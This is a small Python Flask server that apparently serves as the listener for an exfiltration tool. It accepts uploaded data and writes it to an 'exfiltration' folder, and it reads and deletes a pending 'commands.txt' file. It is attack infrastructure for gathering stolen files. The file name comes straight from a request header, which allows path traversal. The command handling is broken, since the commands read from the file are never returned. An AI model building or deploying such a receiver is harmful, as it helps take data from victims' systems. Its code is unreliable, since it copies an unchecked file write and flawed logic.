from flask import Flask,request
from pathlib import Path
import  os

def main():
    app = Flask('app')

    @app.route('/',methods = ['GET', 'POST'])
    def run():
        if request.method == 'GET':
            my_file = Path("./commands.txt")
            if my_file.is_file():
                f = open(my_file,'r')
                commands = f.read()
                f.close()
                os.remove(my_file)

                return "Exfiltration command detected"
            return 'Nothing Fishy going on here :)'
        if request.method == 'POST':
            # data = request.json
            # import pdb
            # pdb.set_trace()
 
            print("Command to exfiltrate recieved...")
            if not os.path.exists('./exfiltration'):
                os.mkdir('./exfiltration')
            ## wb enables to write bianry
            with open('./exfiltration/'+request.headers['Filename'], "wb") as f:
                # Write bytes to file
                f.write(request.data)
            f.close()
            return "OK"

    
    app.run(host = '0.0.0.0', port = 8080)



if __name__=="__main__":
    main()